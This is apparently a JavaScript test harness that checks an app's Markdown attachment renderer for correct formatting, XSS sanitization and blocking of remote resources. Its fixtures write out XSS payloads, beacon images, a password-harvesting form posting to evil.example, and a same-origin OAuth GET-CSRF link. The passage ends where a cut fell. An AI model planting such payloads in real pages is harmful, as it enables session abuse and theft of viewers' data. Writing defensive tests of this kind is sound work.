// verify_attach_source_markdown.mjs
// REQ-20260812T2030-attach-md-render — 첨부 `.md` 를 **마크다운 문서로** 렌더.
//
// 사용자 요청(2026-08-12, 재지시): "구문 색이 아니라, 실제 마크다운 구성으로 출력되도록
// 구현해주세요." — 선행 cycle(`attach-md-highlight`)이 같은 요청을 *구문 하이라이트*로 처리한
// 것을 정정한다. 요청의 본질은 "포맷을 색으로 구분" 이 아니라 "포맷대로 보여 달라" 였다.
//
// 검증 7축:
//   (A) 토글 판정 — `.md` 첨부에서만 노출. 렌더할 본문이 없는 화면(바이너리·빈 문서·조회 실패)
//       에서는 뜨지 않는다(이 모듈이 반복해 봉인한 거짓 어포던스 축).
//   (B) 렌더 계약 — **실 vendor**(`marked.umd.js` + `purify.min.js`)를 jsdom 에 실제로 로드해
//       제목/표/목록/강조/코드/인용/구분선이 각각의 HTML 요소가 되는지 단정한다. 스텁 렌더러로
//       "호출됐다" 만 보면 파이프라인 결합이 깨져도 통과한다(vacuous).
//   (C) 텍스트 보존 — 렌더 결과의 가시 텍스트에 원문의 의미 단위가 남는다(마커는 사라져도 내용은
//       사라지지 않는다). 원문 토글로 돌아가면 **byte 무손실** 원문 표.
//   (D) XSS — `<script>`·`onerror`·`javascript:`·`<iframe>` 이 살아남지 않는다.
//   (E) 원격 리소스 차단 — 교차 출처 `img/iframe/...` 은 **로드되지 않고** 텍스트 칩으로 대체된다.
//       외부 링크는 `target=_blank` + `rel="noopener noreferrer nofollow"`.
//       (첨부는 사용자가 올린 임의 바이트이고 그룹 멤버 전원이 연다 — 로드 자체가 열람 신호다.
//        응답 CSP 는 report-only 라 브라우저가 막아 주지 않는다.)
//   (F) 폴백 — 렌더 라이브러리가 없으면 **빈 화면이 아니라** 원문 표 + 사유 배너.
//   (G) 실구동 — 실제 모달을 몰아 토글 전환·영속·구문색 토글과의 배타를 확인. diff(변경 있음)
//       화면에는 마크다운 토글이 뜨지 않는다(줄 대조가 사라지면 안 된다).
//
// 실행: node verify_attach_source_markdown.mjs   (Node18 + jsdom@22 핀, /tmp 우선 해석)
//   최종 시각 확인(서식·가독성)은 PB-0008 실 Windows 브라우저 — jsdom 은 렌더 픽셀을 못 본다.
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { createRequire } from "node:module";

const __dirname = dirname(fileURLToPath(import.meta.url));
const STATIC = join(__dirname, "..", "src", "static");
const read = (...seg) => readFileSync(join(STATIC, ...seg), "utf8");
const diffJs = read("app", "attach-diff.js");
const chatCss = read("css", "chat.css");
const appJs = read("app.js");

const require = createRequire(import.meta.url);
let JSDOM = null;
for (const base of ["/tmp", __dirname, process.cwd()]) {
  try { ({ JSDOM } = require(require.resolve("jsdom", { paths: [base] }))); if (JSDOM) break; } catch (_) { /* next */ }
}
if (!JSDOM) { try { ({ JSDOM } = require("jsdom")); } catch (_) { /* fall through */ } }
if (!JSDOM) {
  console.error("jsdom 미설치 — `npm i jsdom@22 --prefix /tmp` 필요. (frontend-only 로컬 게이트)");
  process.exit(2);
}

let passed = 0, failed = 0;
function ok(name, cond, detail) {
  if (cond) { passed++; console.log(`  PASS  ${name}`); }
  else { failed++; console.log(`  FAIL  ${name}${detail === undefined ? "" : `  — ${detail}`}`); }
}

// ── 실 vendor 로드 ───────────────────────────────────────────────────────────
// 스텁이 아니라 **배포되는 그 파일**을 jsdom window 에서 평가한다. `markdownToHtml` 의 계약은
// "marked 가 만든 HTML 을 DOMPurify 가 정화한다" 이고, 그 두 라이브러리의 실제 동작(어떤 태그가
// 살아남는지)이 곧 이 기능의 보안 경계다 — 스텁으로는 그 경계를 검증할 수 없다.
// `runScripts: "dangerously"` 가 필요하다 — 없으면 `window.Function` 이 **바깥(Node) 렐름**의
// Function 이라 그 안에서 `window`/`self` 가 보이지 않고, UMD 번들이 전역을 못 잡는다
// (초판이 이 함정에 걸려 V1/V2 가 조용히 FAIL 했다). 로컬 하네스 + 저장소 자산만 평가한다.
const dom = new JSDOM("<!doctype html><html><body></body></html>", {
  url: "https://app.local/",
  runScripts: "dangerously",
});
const { window } = dom;
function evalInWindow(code, label) {
  try {
    window.eval(code);
    return true;
  } catch (e) {
    console.error(`vendor 로드 실패 (${label}): ${e && e.message}`);
    return false;
  }
}
const markedOk = evalInWindow(read("vendor", "marked.umd.js"), "marked");
const purifyOk = evalInWindow(read("vendor", "purify.min.js"), "purify");
ok("V1 실 vendor marked 로드", markedOk && typeof window.marked?.parse === "function");
ok("V2 실 vendor DOMPurify 로드", purifyOk && typeof window.DOMPurify?.sanitize === "function");
if (!markedOk || !purifyOk) {
  console.error("vendor 미로드 — 이 하네스의 핵심 축이 검증 불가. 실패로 종료한다(무음 skip 금지).");
  process.exit(1);
}

// `markdownToHtml` 은 app.js 정본을 그대로 쓴다(복제 금지). app.js 는 거대 ESM 이므로 필요한
// 함수 4개만 잘라 같은 window 위에서 평가한다 — 잘라낸 범위가 정본과 어긋나면 아래 S1 이 잡는다.
function sliceFn(src, name) {
  const start = src.indexOf(`function ${name}(`);
  if (start < 0) return null;
  let i = src.indexOf("{", start), depth = 0;
  for (; i < src.length; i++) {
    if (src[i] === "{") depth += 1;
    else if (src[i] === "}") { depth -= 1; if (depth === 0) return src.slice(start, i + 1); }
  }
  return null;
}
const MD_FNS = ["enhanceDiffBlocks", "enhanceAttachmentEditBlocks", "enhanceSqlBlocks", "markdownToHtml"];
const sliced = MD_FNS.map((n) => sliceFn(appJs, n));
ok("S1 app.js 에서 markdown 파이프라인 4함수 추출", sliced.every(Boolean),
  MD_FNS.filter((n, i) => !sliced[i]).join(","));
// `enhanceMermaidBlocks` 는 별 파일(`mermaid-render.js`)에 있고 `markdownToHtml` 이 `typeof` 로
// 옵셔널 호출한다. **로드하지 않으면 ```mermaid 가 `.mermaid-block` 으로 바뀌지 않아**, 첨부
// 경로의 mermaid 처리 축이 통째로 vacuous 해진다(뮤테이션 M12 가 살아남아 적발됨). 실제
// 배포 조합과 같게 물린다.
const mermaidJs = read("mermaid-render.js");
const slicedMermaid = sliceFn(mermaidJs, "enhanceMermaidBlocks");
ok("S1b mermaid-render.js 에서 enhanceMermaidBlocks 추출 (미로드 시 mermaid 축 vacuous)",
  Boolean(slicedMermaid));
// enhanceSqlBlocks 가 참조하는 SQL 토큰 지식은 code-highlight.js 정본에서 온다.
const CH_SRC = read("code-highlight.js").replace(/^export\s+/gm, "");
const markdownToHtml = window.eval(
  "(function(){\n" +
  `${CH_SRC}\n${slicedMermaid || ""}\n${sliced.filter(Boolean).join("\n")}\n` +
  "function escapeHtml(v){return String(v==null?'':v).replace(/[&<>\"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','\"':'&quot;',\"'\":'&#39;'}[c]));}\n" +
  "return markdownToHtml;})()");
ok("S2 markdownToHtml 구동 가능", typeof markdownToHtml === "function" &&
  /<h1[ >]/.test(markdownToHtml("# t")), markdownToHtml("# t").slice(0, 60));

// ── 정본 모듈 로드 ───────────────────────────────────────────────────────────
const MODULE_BODY = diffJs
  .replace(/^import\s+\{[^}]*\}\s+from\s+"[^"]*";\s*$/gm, "")
  .replace(/^export\s+/gm, "");
if (/^import\s/m.test(MODULE_BODY)) { console.error("import 잔존"); process.exit(2); }

const CH = new Function(`${CH_SRC}
  return { detectCodeLanguage, paintCodeInto, codeLanguageLabel };`)();

let API_RESPONSE = {};
let API_STATUS = 200;
let STORE = {};
let MD_IMPL = markdownToHtml;          // F축에서 널 구현으로 바꿔 폴백을 검사한다
const mkStubs = () => ({
  document: window.document,
  window,
  localStorage: {
    getItem: (k) => (k in STORE ? STORE[k] : null),
    setItem: (k, v) => { STORE[k] = String(v); },
    removeItem: (k) => { delete STORE[k]; },
  },
  requestAnimationFrame: (fn) => fn(),
  apiFetch: async () => {
    if (API_STATUS >= 400) {
      const err = new Error(API_RESPONSE.error || "Service Unavailable");
      err.status = API_STATUS;
      throw err;
    }
    return API_RESPONSE;
  },
  bindBackdropDismiss: () => {},
  showToast: () => {},
  escapeHtml: (v = "") => String(v).replace(/[&<>"']/g, (c) => (
    { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c])),
  detectCodeLanguage: CH.detectCodeLanguage,
  paintCodeInto: CH.paintCodeInto,
  codeLanguageLabel: CH.codeLanguageLabel,
  markdownToHtml: (t) => MD_IMPL(t),
});
const EXPORTS = ["openAttachmentSourceModal", "openAttachmentDiffModal", "_renderSource",
  "_hardenRenderedMarkdown", "_isSameOriginOrInline", "_mediaLoadAllowed"];
const mkModule = () => {
  const s = mkStubs();
  return new Function(...Object.keys(s), `${MODULE_BODY}\nreturn { ${EXPORTS.join(", ")} };`)(...Object.values(s));
};
const M = mkModule();
for (const n of EXPORTS) ok(`S3 로드됨 ${n}`, typeof M[n] === "function");

const MD_LINES = [
  "# 스키마 정의서",
  "",
  "본 문서는 `orders` 테이블을 설명합니다. **중요**한 내용입니다.",
  "",
  "## 컬럼",
  "",
  "| 컬럼 | 타입 |",
  "|------|------|",
  "| id   | BIGINT |",
  "",
  "- 첫째 항목",
  "- 둘째 항목",
  "",
  "> 인용문입니다.",
  "",
  "---",
  "",
  "```sql",
  "SELECT 1;",
  "```",
];
const mkRows = (lines) => lines.map((t, i) => ({ type: "equal", left_no: i + 1, left: t, right_no: i + 1, right: t }));
const MD_RESP = {
  viewable: true,
  attachment_id: 7,
  filename: "spec.md",
  version: { version_number: 1, size: 512, is_latest: true },
  stats: { lines: MD_LINES.length },
  caps: { source_bytes: 1048576, rows: 6000 },
  truncated: {},
  rows: mkRows(MD_LINES),
};
const tick = () => new Promise((r) => setTimeout(r, 0));
const openSource = async (resp, opts) => {
  window.document.body.innerHTML = "";
  API_RESPONSE = resp; API_STATUS = 200;
  const mod = mkModule();
  mod.openAttachmentSourceModal(7, opts || { filename: resp.filename });
  await tick(); await tick();
  return window.document;
};

// ── (A) 토글 판정 ────────────────────────────────────────────────────────────
console.log("\n[A] 마크다운 토글 노출 판정");
{
  let doc = await openSource(MD_RESP);
  const wrap = doc.querySelector(".attach-source-mdtoggle");
  ok("A1 `.md` 첨부는 마크다운 토글 노출", !!wrap && wrap.hidden === false);
  ok("A2 기본은 켬 (요청: 마크다운으로 출력)", doc.querySelector(".attach-source-md-cb").checked === true);
  ok("A3 렌더 중에는 구문 색 토글 숨김 (칠할 원문 줄이 화면에 없다 — 거짓 어포던스 금지)",
    doc.querySelector(".attach-diff-hltoggle").hidden === true);

  doc = await openSource({ ...MD_RESP, filename: "schema.sql", rows: mkRows(["SELECT 1;"]) },
    { filename: "schema.sql" });
  ok("A4 `.sql` 첨부에는 마크다운 토글 없음",
    doc.querySelector(".attach-source-mdtoggle").hidden === true);
  ok("A4b 그 화면의 구문 색 토글은 그대로 노출 (선행 기능 무회귀)",
    doc.querySelector(".attach-diff-hltoggle").hidden === false);

  doc = await openSource({ ...MD_RESP, viewable: false, rows: [] });
  ok("A5 바이너리(viewable=false)는 토글 없음",
    doc.querySelector(".attach-source-mdtoggle").hidden === true);
  doc = await openSource({ ...MD_RESP, rows: [] });
  ok("A6 빈 문서도 토글 없음", doc.querySelector(".attach-source-mdtoggle").hidden === true);

  window.document.body.innerHTML = "";
  API_STATUS = 503; API_RESPONSE = { error: "boom" };
  const mod = mkModule();
  mod.openAttachmentSourceModal(7, { filename: "spec.md" });
  await tick(); await tick();
  ok("A7 조회 실패도 토글 없음",
    window.document.querySelector(".attach-source-mdtoggle").hidden === true);
  API_STATUS = 200;
}

// ── (B) 렌더 계약 (실 vendor) ────────────────────────────────────────────────
console.log("\n[B] 렌더 계약 — 마크다운이 실제 HTML 구조가 되는가");
{
  const doc = await openSource(MD_RESP);
  const host = doc.querySelector(".attach-source-md");
  ok("B1 렌더 컨테이너 생성 + 말풍선 타이포 상속(message-content 병기)",
    !!host && host.classList.contains("message-content"));
  ok("B2 원문 줄 표가 아니다 (렌더 뷰에서는 줄번호 표가 없어야 한다)",
    !!host && doc.querySelectorAll("table.attach-diff-table.is-source").length === 0);
  ok("B3 `#`/`##` → h1/h2", !!host && !!host.querySelector("h1") && !!host.querySelector("h2"),
    host && host.innerHTML.slice(0, 80));
  ok("B4 표 → <table> + <th>/<td>",
    !!host && !!host.querySelector("table") && !!host.querySelector("th") && !!host.querySelector("td"));
  ok("B4b 표는 전용 wrap 안에 (넓은 표가 문서 전체를 가로 스크롤시키지 않게)",
    !!host && !!host.querySelector(".attach-source-md-tablewrap > table"));
  ok("B5 `-` 목록 → <ul>/<li> 2개", !!host && host.querySelectorAll("ul > li").length === 2);
  // codex 적대 리뷰 3R [P1] — `input` 을 프로필에서 막으면 GFM 작업 목록의 **체크 상태가 조용히
  // 사라져** `- [x]` 와 `- [ ]` 가 같은 목록이 된다. 요청한 기능 자체의 회귀라 별 축으로 잠근다.
  {
    const d = await openSource({ ...MD_RESP, rows: mkRows(["- [x] 완료 항목", "- [ ] 대기 항목"]) });
    const h = d.querySelector(".attach-source-md");
    ok("B5b 전제 — 파이프라인이 GFM 작업 목록을 checkbox 로 만든다",
      /type="checkbox"/.test(markdownToHtml("- [x] a\n- [ ] b")));
    ok("B5c GFM `- [x]`/`- [ ]` 의 **상태가 보존**된다 (체크/미체크가 구분됨)",
      !!h && h.querySelectorAll(".attach-source-md-task").length === 2
      && h.querySelectorAll(".attach-source-md-task.is-checked").length === 1,
      h && h.innerHTML.slice(0, 200));
    ok("B5d 그 상태 표식은 **비대화형**이다 (input 0 — 피싱 표면 금지)",
      !!h && h.querySelectorAll("input").length === 0);
    STORE = {};
  }
  ok("B6 `**강조**` → <strong>", !!host && !!host.querySelector("strong"));
  ok("B7 인라인 `` `code` `` → <code>", !!host && !!host.querySelector("code"));
  ok("B8 `>` 인용 → <blockquote>", !!host && !!host.querySelector("blockquote"));
  ok("B9 `---` → <hr>", !!host && !!host.querySelector("hr"));
  ok("B10 ```sql fence → <pre><code>", !!host && !!host.querySelector("pre code"));
  ok("B11 마크다운 마커가 화면 텍스트에 남지 않는다 (`#`·`**`·`|` 이 그대로 보이면 렌더 실패)",
    !!host && !/^#\s|\*\*중요\*\*|\|------\|/.test(host.textContent),
    host && host.textContent.slice(0, 80));
}

// ── (C) 텍스트 보존 / 원문 복귀 ──────────────────────────────────────────────
console.log("\n[C] 내용 보존 · 원문 복귀");
{
  const doc = await openSource(MD_RESP);
  const host = doc.querySelector(".attach-source-md");
  const txt = (host && host.textContent) || "";
  const carried = ["스키마 정의서", "orders", "중요", "컬럼", "BIGINT", "첫째 항목", "둘째 항목", "인용문입니다", "SELECT 1;"];
  const missing = carried.filter((s) => !txt.includes(s));
  ok(`C1 원문의 의미 단위 ${carried.length}개가 렌더 결과에 모두 남는다`, missing.length === 0, missing.join(","));

  // 원문 토글로 복귀 — byte 무손실이 계약이다(마크다운 렌더는 표시 방식이지 내용 변형이 아니다).
  const cb = doc.querySelector(".attach-source-md-cb");
  cb.checked = false;
  cb.dispatchEvent(new window.Event("change", { bubbles: true }));
  await tick();
  const cells = Array.from(doc.querySelectorAll("td.attach-diff-code")).map((td) => td.textContent);
  ok("C2 원문 보기로 복귀하면 줄 표가 돌아온다", cells.length === MD_LINES.length, String(cells.length));
  ok("C3 원문 byte 무손실", cells.join("\n") === MD_LINES.join("\n"));
  ok("C4 원문 보기에서는 구문 색 토글이 다시 보인다",
    doc.querySelector(".attach-diff-hltoggle").hidden === false);
  ok("C5 렌더 컨테이너는 사라진다", doc.querySelectorAll(".attach-source-md").length === 0);
}

// ── (D) XSS ─────────────────────────────────────────────────────────────────
console.log("\n[D] XSS — 첨부 본문은 사용자가 올린 임의 바이트다");
{
  const EVIL = [
    "# 제목",
    "<script>window.__pwned = 1;</script>",
    '<img src=x onerror="window.__pwned=2">',
    "[클릭](javascript:window.__pwned=3)",
    '<iframe src="https://evil.example/frame"></iframe>',
    '<a href="javascript:alert(1)">링크</a>',
    "<svg onload=\"window.__pwned=4\"></svg>",
  ];
  window.__pwned = undefined;
  // C 축이 원문 보기로 끈 상태를 저장했다 — 그대로 두면 이 축이 **줄 표**를 검사하며
  // "XSS 없음" 을 vacuous pass 한다(렌더 경로를 아예 타지 않으므로). 축 사이 상태를 끊는다.
  STORE = {};
  const doc = await openSource({ ...MD_RESP, rows: mkRows(EVIL) });
  const host = doc.querySelector(".attach-source-md");
  ok("D1 렌더는 되었다 (방어가 화면을 죽이지 않는다)", !!host);
  ok("D2 <script> 0", !!host && host.querySelectorAll("script").length === 0);
  ok("D3 <iframe> 0", !!host && host.querySelectorAll("iframe").length === 0);
  ok("D4 onerror/onload 등 인라인 핸들러 0",
    !!host && Array.from(host.querySelectorAll("*")).every((el) =>
      !Array.from(el.attributes).some((a) => /^on/i.test(a.name))));
  ok("D5 javascript: 링크 0",
    !!host && Array.from(host.querySelectorAll("a[href]")).every((a) =>
      !/^javascript:/i.test(a.getAttribute("href") || "")));
  ok("D6 실행 부작용 0 (전역 오염 없음)", window.__pwned === undefined, String(window.__pwned));
  // 마크다운 경로가 라이브 DOM 에 넣는 것은 **sanitize 를 두 번 거친 inert 조각**뿐이다.
  // 문자열 템플릿을 조립해 innerHTML 에 먹이는 경로가 생기면 sanitize 를 우회한다.
  // 특정 문자열(`host.innerHTML`)만 배제하는 검사는 `container.innerHTML = safe` 같은 변형을
  // 놓친다(codex 적대 리뷰 3R [P2] — 그 뮤테이션이 실제로 통과했다). **함수 본문을 잘라
  // 그 안의 모든 `.innerHTML =` 대입 대상을 열거**하고, inert template 외의 대상이 있으면 실패.
  const mdFnBody = (() => {
    const i = diffJs.indexOf("function _renderMarkdownInto");
    if (i < 0) return "";
    let j = diffJs.indexOf("{", i), d = 0;
    for (; j < diffJs.length; j++) {
      if (diffJs[j] === "{") d += 1;
      else if (diffJs[j] === "}") { d -= 1; if (d === 0) return diffJs.slice(i, j + 1); }
    }
    return "";
  })();
  // 주석 안의 설명 코드가 검사에 걸리지 않게 주석을 먼저 지운다(초판이 주석의 예시 코드를
  // 실제 대입으로 세어 오탐했다 — 검사가 잡음이면 다음 사람이 검사를 지운다).
  const stripJsComments = (src) => src
    .replace(/\/\*[\s\S]*?\*\//g, "")
    .replace(/(^|[^:])\/\/[^\n]*/g, "$1");
  const innerHtmlTargets = [...stripJsComments(mdFnBody).matchAll(/(\w+)\.innerHTML\s*=/g)]
    .map((m) => m[1]);
  ok("D7 md 경로의 innerHTML 대입 대상이 inert template 뿐 (라이브 노드 주입 0)",
    mdFnBody.length > 0 && innerHtmlTargets.length >= 2
    && innerHtmlTargets.every((t) => /^tpl/.test(t)),
    `targets=[${innerHtmlTargets.join(",")}]`);
  ok("D7b 문자열 템플릿 조립 주입 경로 없음",
    !/attach-source-md[^\n]*innerHTML\s*=\s*`/.test(diffJs));
}

// ── (E) 원격 리소스 차단 ─────────────────────────────────────────────────────
console.log("\n[E] 교차 출처 리소스 — 로드 자체가 열람 신호다");
{
  const REMOTE = [
    "# 문서",
    "![추적](https://tracker.example/beacon.gif)",
    "![로고](/static/logo.png)",
    "![인라인](data:image/png;base64,iVBORw0KGgo=)",
    "[외부 링크](https://external.example/page)",
    "[내부 링크](/conversations/1)",
  ];
  STORE = {};                       // 이 축도 **렌더 경로**를 검사한다(위 D 축 주석과 같은 이유)
  const doc = await openSource({ ...MD_RESP, rows: mkRows(REMOTE) });
  const host = doc.querySelector(".attach-source-md");
  ok("E0 렌더 경로에서 검사 중임 (원문 표였다면 이하 축이 vacuous)", !!host);
  const imgs = Array.from(host.querySelectorAll("img")).map((i) => i.getAttribute("src") || "");
  ok("E1 교차 출처 이미지는 DOM 에 남지 않는다 (fetch 0)",
    !imgs.some((s) => /^https?:\/\/tracker\.example/.test(s)), imgs.join(","));
  ok("E2 차단 사실이 텍스트로 표면화된다 (숨기지 않는다 — 미디어 2 + 내부 링크 1)",
    host.querySelectorAll(".attach-source-md-blocked").length === 3 &&
    Array.from(host.querySelectorAll(".attach-source-md-blocked"))
      .some((c) => c.textContent.includes("tracker.example")),
    String(host.querySelectorAll(".attach-source-md-blocked").length));
  // codex 적대 리뷰 4R [P1] — "같은 출처면 안전" 은 **틀렸다**. 이 앱에는 GET 만으로 상태가 움직이는
  // 인증 엔드포인트가 있어(`oauth_as.py` authorize) `![](/api/ai/oauth/authorize?redirect_uri=…)`
  // 한 줄이면 열람자 세션으로 인가 코드가 발급된다 — 정보 유출이 아니라 **권한 행사**다.
  ok("E3 같은 출처 이미지도 로드하지 않는다 (GET-CSRF 차단 — `data:` 만 허용)",
    !imgs.some((s) => s === "/static/logo.png"), imgs.join(","));
  ok("E4 data: 이미지는 유지 (네트워크 요청 없음)", imgs.some((s) => s.startsWith("data:image/")));
  const ext = host.querySelector('a[href^="https://external.example"]');
  ok("E5 외부 링크는 target=_blank + rel=noopener noreferrer nofollow",
    !!ext && ext.getAttribute("target") === "_blank" &&
    /noopener/.test(ext.getAttribute("rel") || "") &&
    /noreferrer/.test(ext.getAttribute("rel") || "") &&
    /nofollow/.test(ext.getAttribute("rel") || ""), ext && ext.getAttribute("rel"));
  // codex 적대 리뷰 5R [P1] — **같은 출처 링크가 더 위험하다**. 교차 출처 링크에는 우리 세션
  // 쿠키가 가지 않지만, 같은 출처 링크는 클릭 한 번으로 **열람자 권한**을 쓴다
  // (`[정상 문서](/api/ai/oauth/authorize?…redirect_uri=https://evil/cb)`). 비활성화하고 URL 을 노출한다.
  ok("E6 같은 출처 링크는 비활성화된다 (열람자 권한 사용 경로 차단)",
    !host.querySelector('a[href="/conversations/1"]')
    && Array.from(host.querySelectorAll(".attach-source-md-blocked"))
      .some((c) => c.textContent.includes("/conversations/1")),
    host.innerHTML.slice(0, 200));
  const notice = Array.from(doc.querySelectorAll(".attach-diff-notice"))
    .map((n) => n.textContent).join(" ");
  ok("E7 차단 건수가 배너로 본문보다 먼저 표면화 (미디어·링크 각각)",
    /이미지·미디어 2건/.test(notice) && /앱 내부 링크 1건/.test(notice), notice.slice(0, 150));
  ok("E8 문서 내 앵커(`#...`)는 남긴다 (긴 문서의 목차가 동작해야 한다)",
    (() => {
      const t = window.document.createElement("template");
      t.innerHTML = '<a href="#sec">목차</a><a href="/api/x">내부</a>';
      const r = M._hardenRenderedMarkdown(t.content);
      return !!t.content.querySelector('a[href="#sec"]') && r.deadLinks === 1;
    })());
  ok("E9 `mailto:` 는 우리 세션과 무관하므로 남긴다",
    (() => {
      const t = window.document.createElement("template");
      t.innerHTML = '<a href="mailto:a@b.c">메일</a>';
      const r = M._hardenRenderedMarkdown(t.content);
      return !!t.content.querySelector('a[href^="mailto:"]') && r.deadLinks === 0;
    })());
}

// ── (E2) 우회 벡터 — codex 적대 리뷰 [P1] 이 지목한 축을 전부 잠근다 ─────────────
// 초판은 `img[src]` 만 봤다. 그러나 요청을 만드는 자리는 그 하나가 아니고(`srcset`·`poster`·
// `xlink:href`), 판정도 문자열(`^https?:`)이라 프로토콜 상대 URL(`//evil`)이 통과했으며,
// 무엇보다 **살아 있는 DOM 에 innerHTML 로 파싱한 뒤** 지워서 비콘이 이미 나간 뒤였다.
console.log("\n[E2] 우회 벡터 (srcset · poster · CSS url · form · 프로토콜 상대 · inert 파싱)");
{
  STORE = {};
  const EVASIVE = [
    "# 우회 시도",
    '<img src="/static/ok.png" srcset="https://evil.example/beacon.gif 2x">',
    '<video poster="https://evil.example/poster.jpg"></video>',
    '<div style="background:url(https://evil.example/css-beacon.png)">스타일 비콘</div>',
    '<form action="https://evil.example/collect"><input name="pw" type="password"></form>',
    '<a href="//evil.example/proto-relative">프로토콜 상대 링크</a>',
    '<svg><image href="https://evil.example/svg-beacon.png"></image></svg>',
    '<iframe src="//evil.example/frame"></iframe>',
    '<object data="https://evil.example/obj"></object>',
  ];
  const doc = await openSource({ ...MD_RESP, rows: mkRows(EVASIVE) });
  const host = doc.querySelector(".attach-source-md");
  ok("E2-0 렌더 경로에서 검사 중", !!host);
  // 최종 DOM 어디에도 외부 출처가 **자동 요청을 만드는 속성**으로 남지 않아야 한다.
  // 두 가지는 의도적으로 제외한다: ① 차단 칩은 URL 을 **텍스트**로 보여 준다(요청 없음, 사용자가
  // 무엇이 있었는지 알아야 한다) ② `<a href>` 는 **클릭해야** 이동하므로 자동 요청이 아니다 —
  // 그쪽은 제거가 아니라 `rel`/`target` 강제가 정답이고 E2-8 이 그것을 검사한다.
  // 스캔 범위는 `.attach-source-md` 안이 아니라 **모달 body 전체**다 — 렌더 컨테이너 밖(예:
  // scroller·wrap)에 주입되는 변형을 놓치지 않기 위해(codex 적대 리뷰 3R [P2]).
  const scanRoot = doc.querySelector(".attach-diff-body") || doc.body;
  const attrHits = [];
  scanRoot.querySelectorAll("*").forEach((el) => {
    const tag = el.tagName.toLowerCase();
    for (const a of Array.from(el.attributes)) {
      if (tag === "a" && a.name === "href") continue;      // 사용자 클릭이 필요 — 자동 요청 아님
      if (/evil\.example/.test(a.value)) attrHits.push(`${tag}[${a.name}]`);
    }
  });
  ok("E2-1 모달 body **전체**에서 자동 요청 속성에 외부 출처 0 (`a[href]` 는 클릭 필요라 제외)",
    attrHits.length === 0, attrHits.join(","));
  ok("E2-2 srcset 우회 차단", host.querySelectorAll("[srcset]").length === 0);
  ok("E2-3 poster/video 차단", host.querySelectorAll("video,[poster]").length === 0);
  ok("E2-4 style 속성 제거 (CSS url() 비콘)", host.querySelectorAll("[style]").length === 0);
  ok("E2-5 form/input 제거 (인증 앱 위 피싱)",
    host.querySelectorAll("form,input,button,textarea,select").length === 0);
  ok("E2-6 svg/image 제거", host.querySelectorAll("svg,image").length === 0);
  ok("E2-7 iframe/object/embed 제거", host.querySelectorAll("iframe,object,embed").length === 0);
  const proto = host.querySelector('a[href^="//evil.example"]');
  ok("E2-8 프로토콜 상대 링크도 외부로 판정 (rel/target 부여)",
    !!proto && proto.getAttribute("target") === "_blank"
    && /noreferrer/.test(proto.getAttribute("rel") || ""),
    proto ? `${proto.getAttribute("target")}|${proto.getAttribute("rel")}` : "링크 없음");

  // **inert 파싱** — 요청은 "최종 DOM 에 없다" 가 아니라 "한 번도 파싱되지 않았다" 로 막아야 한다.
  // 라이브 노드에 innerHTML 을 먹이면 그 순간 요청이 나가므로, 구조로 잠근다.
  ok("E2-9 렌더는 <template>(inert)에서 파싱한다 — 라이브 노드 innerHTML 대입 없음",
    /const tpl = document\.createElement\("template"\);\s*\n\s*tpl\.innerHTML = safe;/.test(diffJs)
    && !/host\.innerHTML = html;/.test(diffJs)
    && /host\.appendChild\(tpl\.content\)/.test(diffJs));
  ok("E2-10 하드닝은 template.content 에 적용된다 (라이브 삽입 **전**)",
    /_hardenRenderedMarkdown\(tpl\.content\)/.test(diffJs));
  // codex 적대 리뷰 6R [P1] — `style` 을 막아도 **클래스**로 같은 일이 된다. 사용자 HTML 이
  // `class="share-mgr-backdrop"`(앱 모달 배경 = `position:fixed; z-index:9999`)를 들고 오면
  // 첨부 문서가 앱 UI 를 위장한다(UI redress). 렌더러가 만든 클래스만 통과시킨다.
  {
    // 빈 줄이 없으면 raw HTML 블록이 뒤의 fence 까지 삼켜 `language-sql` 이 생기지 않는다 —
    // 그러면 E2-21 이 "렌더러 클래스가 살아남는가" 를 물을 대상 자체가 없어 vacuous 가 된다.
    const REDRESS = [
      "# 위장",
      "",
      '<div class="share-mgr-backdrop attach-diff-backdrop" id="mentionAutocomplete">가짜 모달</div>',
      "",
      '<p class="message-content is-user">가짜 말풍선</p>',
      "",
      "```sql",
      "SELECT 1;",
      "```",
    ];
    const d = await openSource({ ...MD_RESP, rows: mkRows(REDRESS) });
    const h = d.querySelector(".attach-source-md");
    const cls = new Set();
    h.querySelectorAll("[class]").forEach((el) => String(el.className).split(/\s+/).forEach((c) => c && cls.add(c)));
    ok("E2-19 앱 CSS 클래스를 빌려 UI 를 위장할 수 없다 (렌더러 클래스만 통과)",
      !cls.has("share-mgr-backdrop") && !cls.has("attach-diff-backdrop")
      && !cls.has("message-content") && !cls.has("is-user"),
      [...cls].join(","));
    ok("E2-20 `id` 도 제거된다 (앱 요소와 충돌·DOM clobbering)",
      h.querySelectorAll("[id]").length === 0);
    ok("E2-21 렌더러 클래스는 살아남는다 (코드블록 구문색이 함께 죽지 않게)",
      [...cls].some((c) => /^sql-(block|tok-)/.test(c) || /^language-/.test(c)),
      [...cls].join(","));
    STORE = {};
  }
  ok("E2-11 첨부 전용 2차 sanitize 프로필이 실제로 적용된다",
    /DOMPurify\.sanitize\(html, _ATTACH_SANITIZE\)/.test(diffJs)
    && /FORBID_TAGS/.test(diffJs) && /FORBID_ATTR/.test(diffJs));

  // ⚠️ **2차 방어선을 직접 겨눈다.** 위 축들은 sanitize 프로필이 입력을 이미 지워서 통과한다 —
  // 즉 하드닝의 다속성 검사(`srcset`/`poster`/`data`/`xlink:href`)는 그 경로로는 **한 번도
  // 실행되지 않는다**. 실제로 URL_ATTRS 를 `["src"]` 로 줄이는 뮤테이션이 전건 통과했다.
  // 방어선을 겹쳐 두는 이유는 "프로필이 완화될 때 잡기 위해서" 이므로, 프로필을 우회한
  // 조각을 **직접** 하드닝에 먹여 그 계층이 살아 있는지 확인한다(죽은 방어선 금지).
  const frag = window.document.createElement("template");
  frag.innerHTML =
    '<img src="/static/ok.png" srcset="https://evil.example/beacon.gif 2x">'
    + '<video poster="https://evil.example/p.jpg"></video>'
    + '<object data="https://evil.example/o"></object>'
    + '<image xlink:href="https://evil.example/x.png"></image>'
    + '<img src="/static/local.png">'
    + '<img src="/api/ai/oauth/authorize?redirect_uri=https://evil.example/cb">'
    + '<img src="data:image/png;base64,iVBORw0KGgo=">';
  const res = M._hardenRenderedMarkdown(frag.content);
  const leftAttrs = [];
  frag.content.querySelectorAll("*").forEach((el) => {
    for (const a of Array.from(el.attributes)) {
